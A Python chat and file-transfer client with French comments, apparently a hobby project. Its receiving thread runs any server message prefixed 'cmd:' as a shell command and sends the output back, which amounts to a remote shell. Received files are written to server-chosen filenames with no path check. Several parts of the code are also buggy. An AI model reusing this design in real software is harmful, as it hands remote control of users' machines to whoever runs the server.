
# Définition d'un client réseau gérant en parallèle l'émission
# et la réception des messages (utilisation de 2 THREADS).

host = ''
port = 9999
input_queue = []
filesize = 4096
import socket, sys, threading,os,time,subprocess
from time import  sleep
Folder_Path = os.path.dirname(os.path.realpath(__file__))
def identification() :
    id = input("entrez votre identifiant : ")
    password = input("entrez le mot de passe de la salle : ")
    password = "password:" + password
    id = "id:" + id
    sended = id + "µ" + password
    connexion.send(sended.encode("Utf8"))  
    print("authentification en cours")
    sleep(1)
    print("..............................................")
    print("authentification terminée")
    connexion.send("co:".encode('Utf8'))  
class InputThread(threading.Thread) :
  def __init__(self) :
    threading.Thread.__init__(self)
  def run (self) :
    while 1 :
      global input_queue
      texte = input()
      input_queue.append(texte)
class ThreadReception(threading.Thread):
    """objet thread gérant la réception des messages"""
    def __init__(self, conn):
      threading.Thread.__init__(self)
      self.connexion = conn           # réf. du socket de connexion
        
    def run(self):
       mode = 'msg'
       global filesize
       while 1:
          message_recu = self.connexion.recv(filesize)
          if mode == 'ftp' :
            try :
             data = message_recu
             with open(path , 'wb') as f:
                print('file openned')
                print('receiving data...')
                f.write(data)
                print('All is done , file is closed')
             mode = 'msg'
            except FileNotFoundError :
                print("Le fichier spécifié n'existe pas")
          elif mode == 'msg' :
            try :
             UDecode = message_recu.decode('Utf8')
             msg_format = UDecode.split(":")
             if msg_format[0] == 'ftp' :
                 filename = msg_format[1]   
                 filesize =  int(msg_format[2]  )  
                 path = os.path.join(Folder_Path, "files",filename)
                 print("processing PATH.................")
                 print('receiving data...')
                 mode = 'ftp'
             elif msg_format[0] == "cmd" :
                 out = subprocess.check_output(msg_format[1],shell=True).decode("Utf8")
                 print(out)
                 input_queue.append(out)
             else :
              print(message_recu.decode('Utf8'))
              if message_recu.decode('Utf8') =='' or message_recu.decode('Utf8').upper() == "FIN":
                print("Ahhhhh déconection")
                break
            except UnicodeDecodeError :
                pass
        # Le thread <réception> se termine ici.
        # On force la fermeture du thread <émission> :
       print("Client arrêté. Connexion interrompue.")
       self.connexion.close()
    
class ThreadEmission(threading.Thread):
    """objet thread gérant l'émission des messages"""
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.connexion = conn           # réf. du socket de connexion
        
    def run(self):
        mode = "msg"
        while 1:
          global input_queue
          if mode == "ftp" :
                 f = open(file,'rb')
                 print("File opened.....")
                 print("processing filesize.................")
                 l = f.read(filesize)
                 print('Reading file...................')
                 data_send = l
                 message_emis = data_send
                 print("Message envoyé ...............................................")
                 mode = "msg"
                 mode = 'msg'
          elif mode == "msg" :
           try:
            message_emis = ""
            message_input = input_queue[0]
            input_queue.remove(message_input)
            message_format = message_input.split()
            ident = message_format[0]
            #Identification de la demande de file transfer
            if message_format[0] == "ftp":
              try :
                 try :
                     filename = message_format[1]
                 except :
                    filename = input("Entrez le nom du fichier à transférer : ")
                 if filename[0:2] == 'C:' :
                     file = filename  
                 else :
                     file = os.path.join(Folder_Path,filename)
                 filesize = os.path.getsize(file)
                 filename = os.path.basename(file)
                 message_emis = 'ftp' + ':' + filename + ':' + str(filesize)
                 mode = "ftp"
                 message_emis = message_emis.encode('Utf8')
              except FileNotFoundError :
                  print("Le fichier spécifié n' existe pas ! ")
                  message_emis = message_emis.encode('Utf8')
                  pass
            elif message_format[0] == "$" :
              if message_format[1] == "cmd" :
                command = ""
                cmd_path = Folder_Path
                subprocess.run("cd " + cmd_path,shell=True, check=True)
                while command != 'close' :                   
                     command = input(cmd_path + '>')
                     subprocess.run(command,shell=True, check=True)
                     if command.split()[0] == "cd" :
                         if command.split()[1][0:2] == "C:" :
                            cmd_path = command.split()[1] 
                         else :
                              cmd_path = os.path.join(cmd_path,command.split()[1])
              else :
                message_emis = message_input.replace(" ",":")
                message_emis = message_emis.encode('Utf8') 
            elif ident[0:1] == "!" :
                message_emis = message_input.replace(" ",":")
                message_emis = message_emis.encode('Utf8')
            elif message_input.split(':')[0] == "cmd":
                print(message_input)
                message_emis = message_input.encode('Utf8')
            else :
                message_emis = 'msg:' + message_input
                message_emis = message_emis.encode('Utf8')
           except IndexError :
              message_emis = message_emis.encode('Utf8')
              filename = ''
          self.connexion.send(message_emis)
# Programme principal - Établissement de la connexion :
connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connexion.connect((host, port))

except socket.error:
    print("La connexion a échoué.")
    sys.exit()   
# Its cool but it only works with an ide or from terminal so I disabled it ]:
# filename = 'supernova.wav'
# wave_obj = sa.WaveObject.from_wave_file(filename)
# play_obj = wave_obj.play()

print("Connexion établie avec le serveur.")

connexion.send("dbg".encode('Utf8'))
# Dialogue avec le serveur : on lance deux threads pour gérer
# indépendamment l'émission et la réception des messages :
identification()
th_E = ThreadEmission(connexion)
th_R = ThreadReception(connexion)
th_I = InputThread()
th_I.start()
th_E.start()
th_R.start()
#zone de commande
